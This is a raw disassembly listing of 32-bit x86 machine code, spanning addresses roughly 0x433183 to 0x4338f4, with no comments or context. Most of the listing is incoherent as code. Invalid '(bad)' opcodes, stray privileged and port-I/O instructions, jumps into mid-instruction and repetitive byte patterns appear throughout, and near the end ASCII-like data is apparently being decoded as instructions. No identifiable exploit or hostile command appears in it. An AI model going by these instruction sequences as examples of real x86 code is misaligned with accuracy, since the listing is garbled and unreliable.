  433183:	cmp    al,0x1
  433186:	inc    ebp
  433187:	add    BYTE PTR ds:0xe98b9c4d,bh
  43318d:	mov    eax,DWORD PTR [ebx]
  43318f:	nop
  433190:	add    BYTE PTR [eax],al
  433192:	inc    ebp
  433193:	mov    esi,DWORD PTR [ebx]
  433195:	add    eax,DWORD PTR [ebx]
  433197:	cmp    al,0x89
  433199:	mov    esp,esi
  43319b:	clc    
  43319c:	inc    ebp
  43319d:	inc    ebp
  43319e:	add    edx,DWORD PTR [esi+0xc]
  4331a1:	mov    edi,0x7ff0845
  4331a6:	in     al,dx
  4331a7:	(bad)  
  4331a8:	jne    0x433145
  4331aa:	mov    esi,DWORD PTR [edx]
  4331ac:	clc    
  4331ad:	add    ebp,DWORD PTR [esi]
  4331af:	mov    edi,edi
  4331b1:	in     al,dx
  4331b2:	mov    DWORD PTR [ebp-0x10],eax
  4331b5:	xor    eax,DWORD PTR [ebp+0x3]
  4331b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331be:	fmul   DWORD PTR [ebx-0x173caf39]
  4331c4:	lea    ecx,[ecx+0x45e8d4bc]
  4331ca:	clc    
  4331cb:	mov    edi,edi
  4331cd:	cmp    BYTE PTR [ebp+0x4d],al
  4331d0:	test   DWORD PTR [eax+0x74],ecx
  4331d3:	inc    ecx
  4331d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331da:	ret    
  4331db:	inc    eax
  4331dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331e2:	push   eax
  4331e3:	dec    eax
  4331e4:	test   al,0xd0
  4331e6:	dec    eax
  4331e8:	mov    eax,DWORD PTR [ebp-0x14]
  4331eb:	mov    eax,DWORD PTR [ebp+0x38]
  4331ee:	mov    eax,ecx
  4331f0:	fadd   DWORD PTR [ebx]
  4331f2:	dec    ebp
  4331f3:	inc    eax
  4331f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331fa:	inc    ebp
  4331fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433201:	fadd   QWORD PTR [ebx]
  433203:	inc    ebp
  433204:	or     al,0x33
  433206:	dec    ebp
  433207:	add    edi,DWORD PTR [ebx]
  433209:	mov    DWORD PTR [edx-0x28],esi
  43320c:	mov    eax,DWORD PTR [ebp-0x10]
  43320f:	mov    eax,DWORD PTR [eax+0x10]
  433212:	mov    eax,edi
  433214:	lock ret 
  433216:	inc    ecx
  433217:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43321d:	fsubr  st,st(5)
  43321f:	test   DWORD PTR [eax],eax
  433221:	clc    
  433222:	push   0x45
  433224:	(bad)  
  433225:	cmp    al,0xec
  433227:	pushf  
  433228:	inc    ebp
  433229:	(bad)  
  43322a:	push   eax
  43322b:	fsub   DWORD PTR [eax-0x7b]
  43322e:	(bad)  
  43322f:	clc    
  433230:	mov    eax,0xf8008584
  433235:	mov    eax,DWORD PTR [ebp-0x4]
  433238:	mov    edi,0x4585c3cc
  43323e:	clc    
  43323f:	mov    eax,DWORD PTR [ebp+0x14]
  433242:	xor    eax,DWORD PTR [ebp-0x64]
  433245:	mov    edi,eax
  433247:	in     al,dx
  433248:	les    esi,FWORD PTR [ebp-0x7b]
  43324b:	mov    edi,eax
  43324d:	or     al,0x4d
  43324f:	dec    ebp
  433250:	mov    eax,ebp
  433252:	in     al,0xf2
  433254:	dec    ebp
  433255:	dec    DWORD PTR [ecx+0x4dc7e045]
  43325b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433261:	inc    ebp
  433262:	mov    DWORD PTR [ebx],esi
  433264:	fadd   QWORD PTR [ebx]
  433266:	dec    ebp
  433267:	push   eax
  433268:	xor    eax,DWORD PTR [ebp+0x3]
  43326b:	push   eax
  43326c:	mov    DWORD PTR [eax+ebx*8],ebx
  43326f:	push   esi
  433271:	mov    eax,DWORD PTR [eax]
  433273:	lock cmp eax,0xf84e85c0
  433279:	inc    ebp
  43327a:	test   BYTE PTR [ebx],dh
  43327c:	add    DWORD PTR [ebx],eax
  43327e:	add    BYTE PTR [eax+0x4d],dl
  433281:	jne    0x4332b6
  433283:	lea    ecx,[ebx-0x7617fc44]
  433289:	div    ah
  43328b:	inc    DWORD PTR [ebp+0x45]
  43328e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433294:	jb     0x433221
  433296:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43329d:	mov    ecx,DWORD PTR [ebp-0x10]
  4332a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4332a3:	mov    edi,DWORD PTR [ebx]
  4332a5:	adc    BYTE PTR [ebp+0x41],dh
  4332a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4332ae:	ret    
  4332af:	push   ss
  4332b0:	push   0x45
  4332b2:	lea    ecx,[ebx+0x4de80cb0]
  4332b8:	sti    
  4332b9:	add    edi,edi
  4332bb:	or     BYTE PTR [ebp+0x4d],al
  4332be:	mov    ebp,DWORD PTR [ebx]
  4332c0:	xor    ebp,ecx
  4332c2:	mov    al,BYTE PTR [edx]
  4332c4:	add    eax,0xc7200
  4332c9:	jne    0x433318
  4332cb:	lea    esi,[ebx]
  4332cd:	mov    al,0xf
  4332cf:	call   0xf2994
  4332d4:	shl    DWORD PTR [ecx],0x84
  4332d7:	pushf  
  4332d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332de:	mov    esi,DWORD PTR [edx]
  4332e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332e7:	test   DWORD PTR [eax],eax
  4332e9:	clc    
  4332ea:	dec    ebp
  4332eb:	inc    ebp
  4332ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4332ef:	pushf  
  4332f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332f7:	lea    eax,[ecx]
  4332f9:	int3   
  4332fa:	add    BYTE PTR [ebp+0x45],cl
  4332fd:	lea    ecx,[ebx-0x75b2cc38]
  433303:	lea    eax,ds:0x4d72c4
  433309:	mov    ecx,DWORD PTR [ebp-0x4]
  43330c:	xor    ecx,edi
  43330e:	bswap  ebx
  433310:	ror    BYTE PTR [ebp-0x35],0xe9
  433314:	rol    DWORD PTR [ecx],0x84
  433317:	add    BYTE PTR [ecx],al
  433319:	xor    eax,DWORD PTR [eax]
  43331b:	pushf  
  43331c:	inc    ebp
  43331d:	jnp    0x8a436720
  433323:	mov    eax,DWORD PTR ds:0xcf72e8
  433329:	lock dec ebp
  43332b:	retf   
  43332c:	xor    ecx,DWORD PTR [ebp+0xf]
  43332f:	mov    eax,eax
  433331:	fmul   st,st(3)
  433333:	test   ecx,0x19b8484
  433339:	xor    al,BYTE PTR [eax]
  43333b:	mov    DWORD PTR [ebp-0x28],eax
  43333e:	mov    eax,DWORD PTR [ebp+0x33]
  433341:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433347:	ret    
  433348:	add    al,cl
  43334a:	dec    ebp
  43334b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433351:	add    ecx,DWORD PTR ds:0xc7250
  433357:	inc    ebp
  433358:	rcl    DWORD PTR [eax+0x4d],0x2b
  43335c:	mov    edi,edi
  43335e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433364:	jb     0x43332d
  433366:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43336d:	mov    esi,DWORD PTR [ebx]
  43336f:	cld    
  433370:	mov    cl,bh
  433372:	or     eax,0x372b6
  433377:	cmp    ecx,eax
  433379:	jne    0x4333f6
  43337f:	mov    eax,DWORD PTR [ebp-0x20]
  433382:	mov    eax,DWORD PTR [eax]
  433384:	xor    eax,edi
  433386:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43338d:	mov    ecx,DWORD PTR [ebp-0x4]
  433390:	mov    ecx,edi
  433392:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433398:	jb     0x4333a9
  43339a:	add    BYTE PTR [edi-0x3f],dl
  43339d:	add    BYTE PTR [ebp-0x75],cl
  4333a0:	mov    esi,eax
  4333a2:	xor    eax,DWORD PTR [eax]
  4333a4:	mov    al,bh
  4333a6:	or     eax,0x4b7284
  4333ab:	xor    al,cl
  4333ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4333b0:	mov    ecx,edi
  4333b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333b8:	jb     0x4333c9
  4333ba:	add    BYTE PTR [edi],dh
  4333bc:	enter  0x8500,0x8b
  4333c0:	add    ah,bl
  4333c2:	add    BYTE PTR [eax],al
  4333c4:	inc    ebp
  4333c5:	(bad)  
  4333c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333cd:	mov    esi,DWORD PTR [edx-0x4]
  4333d0:	add    bh,cl
  4333d2:	dec    ebp
  4333d3:	mov    dh,0x8b
  4333d5:	add    esi,DWORD PTR [ebx]
  4333d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333dd:	add    BYTE PTR [eax],al
  4333df:	mov    eax,ecx
  4333e1:	loopne 0x433430
  4333e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333e9:	dec    ebx
  4333ea:	or     eax,0x8b7232
  4333ef:	in     al,0xc1
  4333f1:	or     DWORD PTR [ebp-0x31],ecx
  4333f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333fb:	xor    dh,BYTE PTR [edx-0x75]
  4333fe:	add    al,dh
  433400:	enter  0x4f09,0xcf
  433404:	inc    ebp
  433405:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43340b:	or     al,BYTE PTR ds:0xe4728b
  433411:	or     DWORD PTR [ebp-0x31],ecx
  433414:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43341b:	cmp    dh,BYTE PTR [edx+0xf]
  43341e:	add    bl,dl
  433420:	rol    DWORD PTR [eax],0x4d
  433423:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433429:	(bad)  
  43342a:	or     eax,0x4b7284
  43342f:	xor    al,cl
  433431:	mov    ecx,DWORD PTR [ebp-0x20]
  433434:	mov    ecx,DWORD PTR [ecx]
  433436:	xor    ecx,edi
  433438:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43343f:	xor    cl,al
  433441:	mov    ecx,DWORD PTR [edi]
  433443:	fadd   QWORD PTR [ebp+0x9]
  433446:	call   0xffd02f1a
  43344b:	dec    ebx
  43344c:	dec    ebp
  43344d:	xor    bh,BYTE PTR [ebx]
  43344f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433453:	loopne 0x433451
  433455:	or     edi,eax
  433457:	iret   
  433458:	ret    
  433459:	mov    WORD PTR [ebp+0x4f],es
  43345c:	mov    esi,DWORD PTR [edx]
  43345e:	call   0x8452fb9d
  433463:	(bad)  
  433464:	fwait
  433465:	add    BYTE PTR [edx],dh
  433467:	mov    esi,DWORD PTR [ebx]
  433469:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43346f:	test   BYTE PTR [ebx],dh
  433471:	dec    ebx
  433472:	add    esi,DWORD PTR [edx]
  433474:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43347a:	dec    edi
  43347c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433483:	xor    al,BYTE PTR [ebx]
  433485:	mov    edi,DWORD PTR [ebx]
  433487:	in     al,0x75
  433489:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43348f:	dec    ebx
  433490:	xor    esi,DWORD PTR [edx]
  433492:	lea    ecx,[edx]
  433494:	or     BYTE PTR [ebx+0x900f072],cl
  43349a:	ja     0x43346b
  43349c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4334a3:	cmp    ch,al
  4334a5:	jne    0x43349a
  4334a7:	mov    edi,edi
  4334a9:	fadd   QWORD PTR [ebp+0x0]
  4334ac:	mov    eax,edi
  4334ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334b5:	mov    edx,DWORD PTR [ebx]
  4334b7:	in     al,0x45
  4334b9:	or     DWORD PTR [ebx],esi
  4334bb:	iret   
  4334bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334c3:	xor    dl,BYTE PTR [eax-0x75]
  4334c6:	sbb    al,0xe0
  4334c8:	dec    DWORD PTR [ecx]
  4334ca:	mov    ecx,edi
  4334cc:	in     al,dx
  4334cd:	mov    eax,es
  4334cf:	dec    ebx
  4334d0:	mov    DWORD PTR [edx],esi
  4334d2:	fmul   QWORD PTR [edx]
  4334d4:	jne    0x433461
  4334d6:	(bad)  
  4334d7:	(bad)  
  4334d9:	or     DWORD PTR [ebp-0x31],eax
  4334dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334e3:	cmp    bh,bh
  4334e5:	jne    0x43352c
  4334e7:	lea    ecx,[ebx-0x38372750]
  4334ed:	inc    ebx
  4334ef:	mov    eax,ecx
  4334f1:	mov    eax,0xa00c111
  4334f6:	jne    0x43353d
  4334f8:	mov    esi,DWORD PTR [ebx]
  4334fa:	test   al,0x3
  4334fc:	inc    ebp
  4334fd:	mov    DWORD PTR [eax-0xc],edx
  433500:	loop   0x433547
  433502:	push   DWORD PTR [ebx]
  433504:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43350a:	add    DWORD PTR [eax],eax
  43350c:	mov    eax,edi
  43350e:	lods   al,BYTE PTR ds:[esi]
  43350f:	dec    ebp
  433510:	inc    ebp
  433511:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433517:	retf   
  433518:	mov    edx,ecx
  43351a:	adc    al,0x84
  43351c:	(bad)  
  43351d:	std    
  43351e:	ret    
  43351f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433525:	hlt    
  433526:	rol    edi,0x82
  433529:	ret    
  43352a:	cld    
  43352b:	enter  0x11ff,0x45
  43352f:	inc    ebp
  433530:	pop    edi
  433531:	mov    ebx,DWORD PTR [ebx+0x14]
  433534:	ret    0xc7
  433537:	test   BYTE PTR [ebx+0x4532519b],cl
  43353d:	jmp    0x4334ca
  43353f:	push   0x8
  433541:	call   DWORD PTR [esi]
  433543:	in     al,dx
  433544:	add    BYTE PTR [ebp+0x1],0x50
  433548:	add    bh,ah
  43354a:	add    bh,bh
  43354c:	icebp  
  43354d:	mov    ecx,DWORD PTR [eax]
  43354f:	cld    
  433550:	pop    es
  433551:	dec    ebp
  433552:	shl    DWORD PTR [ebx],0x72
  433555:	add    eax,DWORD PTR [eax]
  433557:	cmp    edx,ecx
  433559:	je     0x43356b
  43355b:	mov    esi,DWORD PTR [ebp-0x4]
  43355e:	inc    edi
  433560:	or     al,0xc3
  433562:	jmp    FWORD PTR [edx-0x18]
  433565:	(bad)  
  433566:	sti    
  433567:	cwde   
  433568:	(bad)  
  433569:	call   0xffa12e74
  43356e:	or     al,0x45
  433570:	push   ebp
  433571:	sub    esp,0x18
  433574:	push   ebx
  433575:	inc    ebp
  433576:	mov    edi,edi
  433578:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43357f:	test   al,0x54
  433581:	inc    ebp
  433582:	push   ecx
  433583:	push   eax
  433584:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43358a:	add    ah,bh
  43358c:	(bad)  
  43358d:	dec    ebp
  43358e:	add    DWORD PTR [ebx],esi
  433590:	inc    ebp
  433591:	add    ecx,DWORD PTR [ebx+0x74943b]
  433597:	push   0xffffff8b
  433599:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43359f:	add    eax,DWORD PTR [ecx]
  4335a1:	or     BYTE PTR [eax],al
  4335a3:	call   0xff852da8
  4335a8:	mov    eax,DWORD PTR [ebp+0x14]
  4335ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4335b1:	inc    ebp
  4335b2:	dec    ecx
  4335b3:	add    ebp,DWORD PTR [edx+0x14]
  4335b6:	push   0x8b3045
  4335bb:	call   0x33ad8330
  4335c0:	inc    DWORD PTR [ebx]
  4335c2:	mov    DWORD PTR [edi],ecx
  4335c4:	mov    eax,ecx
  4335c6:	or     BYTE PTR [ebp-0x3d],cl
  4335c9:	cmp    eax,edi
  4335cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335d6:	adc    al,0xc9
  4335d8:	inc    ebp
  4335d9:	adc    BYTE PTR [eax+0x55],dl
  4335dc:	jne    0x4335ca
  4335de:	call   0xff54356e
  4335e3:	dec    ebp
  4335e4:	inc    ebp
  4335e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335eb:	add    BYTE PTR [ebx],bh
  4335ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335f1:	push   esp
  4335f2:	or     al,0x51
  4335f4:	dec    ebp
  4335f5:	xor    DWORD PTR [ebx],0xf32039b
  4335fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4335fe:	mov    edi,edi
  433600:	pop    edi
  433601:	adc    BYTE PTR [ebx+0x75],bl
  433604:	ret    0x50
  433607:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43360b:	(bad)  
  43360c:	clc    
  43360d:	mov    esp,ebp
  43360f:	pop    ecx
  433610:	mov    ecx,0xf80085c2
  433615:	mov    ecx,DWORD PTR [ecx+edx*2]
  433618:	push   esi
  433619:	push   esi
  43361a:	(bad)  
  43361b:	lock add DWORD PTR [ebp+0x44],eax
  43361f:	mov    edx,DWORD PTR [eax]
  433621:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433625:	or     BYTE PTR [edi+eax*1+0x51],dl
  433629:	ret    
  43362a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433630:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433636:	or     al,0x80
  433638:	jge    0x43363b
  43363a:	mov    DWORD PTR [eax],eax
  43363c:	and    al,0x8
  43363e:	cmp    DWORD PTR [ebp+0x10],eax
  433641:	mov    edx,DWORD PTR [esi]
  433643:	xchg   esp,eax
  433644:	dec    esp
  433645:	add    BYTE PTR [eax],dl
  433647:	mov    ecx,edx
  433649:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43364d:	dec    ebp
  43364e:	into   
  43364f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433655:	mov    edx,DWORD PTR [eax+0x14]
  433658:	das    
  433659:	add    al,0x45
  43365b:	add    BYTE PTR [ebp+0x0],dh
  43365e:	mov    edi,edi
  433660:	and    al,0x50
  433662:	mov    eax,DWORD PTR [eax]
  433664:	and    al,0xd1
  433666:	xor    eax,DWORD PTR [esi]
  433668:	lea    eax,[ebp+0x8]
  43366b:	xor    esi,DWORD PTR [edx+0x3]
  43366e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433674:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43367a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433684:	cmp    al,0xff
  433686:	pushf  
  433687:	mov    edi,edi
  433689:	or     BYTE PTR [esi+ecx*1],cl
  43368c:	jne    0x433651
  43368e:	call   0xc365a
  433693:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433697:	mov    ebx,DWORD PTR [eax]
  433699:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43369d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4336a5:	pop    esi
  4336a6:	and    al,0xc9
  4336a8:	call   DWORD PTR [eax]
  4336aa:	and    al,0x55
  4336ac:	call   0x28359d
  4336b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4336b6:	clc    
  4336b7:	pushf  
  4336b8:	dec    DWORD PTR [ecx+0x57892474]
  4336be:	jmp    0x433701
  4336c0:	and    al,0x89
  4336c2:	and    al,0x24
  4336c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4336ca:	dec    DWORD PTR [eax]
  4336cc:	and    al,0x7
  4336ce:	pop    esi
  4336cf:	cli    
  4336d0:	in     eax,0x9b
  4336d2:	ret    0x32
  4336d5:	add    eax,edx
  4336d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4336dd:	or     al,0xf8
  4336df:	jl     0x43375e
  4336e1:	adc    al,0x9c
  4336e3:	dec    ebp
  4336e4:	push   0xff8b7575
  4336e9:	and    al,0xff
  4336eb:	xor    edi,edi
  4336ed:	mov    esi,DWORD PTR [esp-0x75]
  4336f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4336f7:	or     bl,ch
  4336f9:	cmp    DWORD PTR [eax],edx
  4336fb:	sbb    al,0x44
  4336fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433701:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433708:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43370f:	test   eax,0x83001010
  433714:	dec    eax
  433715:	adc    BYTE PTR [eax],al
  433717:	adc    edi,DWORD PTR [edx+0x10]
  43371a:	add    cl,bh
  43371c:	jae    0x43372e
  43371e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433724:	pop    eax
  433725:	adc    BYTE PTR [eax],al
  433727:	fidiv  DWORD PTR [ebp+0x10]
  43372a:	add    dh,bl
  43372c:	movups xmm0,XMMWORD PTR [eax]
  43372f:	popf   
  433730:	push   cs
  433731:	adc    BYTE PTR [eax],al
  433733:	ins    DWORD PTR es:[edi],dx
  433734:	or     BYTE PTR [eax],dl
  433736:	add    BYTE PTR [ebx+eiz*2+0x370f0010],cl
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [edi],ah
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ebx],ch
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [edi],ch
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [ebx],dh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [edi],dh
  433764:	aaa    
  433765:	inc    ebx
  433766:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43376c:	cmp    al,0x10
  43376e:	add    BYTE PTR [ebx+0x30],cl
  433771:	adc    BYTE PTR [eax],al
  433773:	sub    al,0xc
  433775:	adc    BYTE PTR [eax],al
  433777:	push   ds
  433778:	adc    BYTE PTR ds:[eax],al
  43377b:	mov    bh,0x56
  43377d:	adc    BYTE PTR [eax],al
  43377f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433783:	cmp    al,0x4f
  433785:	adc    BYTE PTR [eax],al
  433787:	addr16 aaa 
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [edi+0x37],dh
  433799:	inc    ebx
  43379a:	add    BYTE PTR [ebx+0x37],bh
  43379d:	inc    ebx
  43379e:	add    BYTE PTR [edi+0x37],bh
  4337a1:	inc    ebx
  4337a2:	add    BYTE PTR [ebx-0x23ffbcc9],al
  4337a8:	pop    esp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	jle    0x4337cd
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	cld    
  4337b0:	dec    edx
  4337b1:	adc    BYTE PTR [eax],al
  4337b3:	add    al,0xb
  4337b5:	adc    BYTE PTR [eax],al
  4337b7:	push   ebx
  4337b8:	ins    DWORD PTR es:[edi],dx
  4337b9:	adc    BYTE PTR [eax],al
  4337bb:	fs jl  0x4337ce
  4337be:	add    BYTE PTR [edx+0x42001015],ah
  4337c4:	jge    0x4337d6
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi-0x4cffbcc9],ch
  4337d4:	aaa    
  4337d5:	inc    ebx
  4337d6:	add    BYTE PTR [edi-0x44ffbcc9],dh
  4337dc:	aaa    
  4337dd:	inc    ebx
  4337de:	add    BYTE PTR [edi-0x3cffbcc9],bh
  4337e4:	aaa    
  4337e5:	inc    ebx
  4337e6:	add    BYTE PTR [edi+0x2300103a],ah
  4337ec:	aas    
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jne    0x4337fc
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	fldenv [esi]
  4337f5:	adc    BYTE PTR [eax],al
  4337f7:	xchg   esp,eax
  4337f8:	push   0x10
  4337fa:	add    bl,ah
  4337fc:	pop    eax
  4337fd:	adc    BYTE PTR [eax],al
  4337ff:	in     al,0x2f
  433801:	adc    BYTE PTR [eax],al
  433803:	leave  
  433804:	sbb    DWORD PTR [eax],edx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    bl,dh
  433814:	aaa    
  433815:	inc    ebx
  433816:	add    bh,dh
  433818:	aaa    
  433819:	inc    ebx
  43381a:	add    bl,bh
  43381c:	aaa    
  43381d:	inc    ebx
  43381e:	add    bh,bh
  433820:	aaa    
  433821:	inc    ebx
  433822:	add    BYTE PTR [ebx],al
  433824:	cmp    BYTE PTR [ebx+0x0],al
  433827:	mov    ebp,0x1d001062
  43382c:	adc    BYTE PTR [eax],dl
  43382e:	add    BYTE PTR [edi+0x51],dl
  433831:	adc    BYTE PTR [eax],al
  433833:	dec    eax
  433834:	ins    DWORD PTR es:[edi],dx
  433835:	adc    BYTE PTR [eax],al
  433837:	mov    eax,DWORD PTR [edi]
  433839:	adc    BYTE PTR [eax],al
  43383b:	mov    ah,0x7
  43383d:	adc    BYTE PTR [eax],al
  43383f:	ror    DWORD PTR [esi],1
  433841:	adc    BYTE PTR [eax],al
  433843:	pop    edi
  433844:	inc    ebp
  433845:	adc    BYTE PTR [eax],al
  433847:	daa    
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	xor    edi,DWORD PTR [eax]
  433855:	inc    ebx
  433856:	add    BYTE PTR [edi],dh
  433858:	cmp    BYTE PTR [ebx+0x0],al
  43385b:	cmp    edi,DWORD PTR [eax]
  43385d:	inc    ebx
  43385e:	add    BYTE PTR [edi],bh
  433860:	cmp    BYTE PTR [ebx+0x0],al
  433863:	inc    ebx
  433864:	cmp    BYTE PTR [ebx+0x0],al
  433867:	dec    ecx
  433868:	ss push eax
  43386a:	pop    edi
  43386b:	ss inc ebx
  43386d:	ss pop edx
  43386f:	xor    ebx,DWORD PTR [edi+0x52]
  433872:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433876:	pop    edi
  433877:	dec    esi
  433878:	dec    esp
  433879:	dec    eax
  43387a:	xor    esi,DWORD PTR [edx]
  43387c:	pop    edi
  43387d:	xor    al,0x4b
  43387f:	add    BYTE PTR [eax+0x49],cl
  433882:	push   ebp
  433883:	xor    al,0x5f
  433885:	dec    esp
  433886:	inc    edx
  433887:	dec    ecx
  433888:	cmp    DWORD PTR [edi+ebx*2],esi
  43388b:	pop    ecx
  43388c:	inc    edi
  43388d:	add    BYTE PTR [eax+0x50],bl
  433890:	dec    eax
  433891:	pop    edi
  433892:	push   ebp
  433893:	push   ecx
  433894:	inc    edi
  433895:	xor    cl,BYTE PTR [edx+0x38]
  433898:	push   esi
  433899:	add    BYTE PTR [ebx+0x4a],al
  43389c:	push   edx
  43389d:	pop    edi
  43389e:	dec    edi
  43389f:	dec    eax
  4338a0:	dec    edi
  4338a1:	dec    edi
  4338a2:	dec    edx
  4338a3:	add    BYTE PTR [ecx+0x52],al
  4338a6:	cmp    DWORD PTR [edi+0x56],ebx
  4338a9:	aaa    
  4338aa:	dec    esp
  4338ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4338ae:	push   edx
  4338af:	inc    esp
  4338b0:	add    BYTE PTR [ecx+0x37],bl
  4338b3:	inc    esp
  4338b4:	pop    edi
  4338b5:	dec    ecx
  4338b6:	xor    esi,DWORD PTR [edi]
  4338b8:	xor    DWORD PTR [edi+0x49],ebx
  4338bb:	push   esp
  4338bc:	xor    eax,DWORD PTR [eax]
  4338be:	push   edx
  4338bf:	xor    BYTE PTR [eax+0x5f],bl
  4338c2:	dec    eax
  4338c3:	push   edi
  4338c4:	inc    esi
  4338c5:	xor    DWORD PTR [edi+0x5f],edx
  4338c8:	cmp    BYTE PTR [ebx+0x37],dl
  4338cb:	add    BYTE PTR [esi+0x42],dl
  4338ce:	dec    ecx
  4338cf:	xor    ebx,DWORD PTR [edi+0x45]
  4338d2:	xor    BYTE PTR [ebp+0x5f],cl
  4338d5:	xor    al,0x34
  4338d7:	xor    BYTE PTR [edx+0x5f],cl
  4338da:	inc    edi
  4338db:	add    BYTE PTR [edx+0x57],dl
  4338de:	xor    ebx,DWORD PTR [edi+0x31]
  4338e1:	dec    edx
  4338e2:	push   edi
  4338e3:	xor    eax,0x4d435f
  4338e8:	dec    ecx
  4338e9:	xor    eax,0x36365f39
  4338ee:	dec    eax
  4338ef:	xor    BYTE PTR [eax],al
  4338f1:	dec    edi
  4338f2:	inc    ebx
  4338f3:	push   edi
  4338f4:	pop    edi
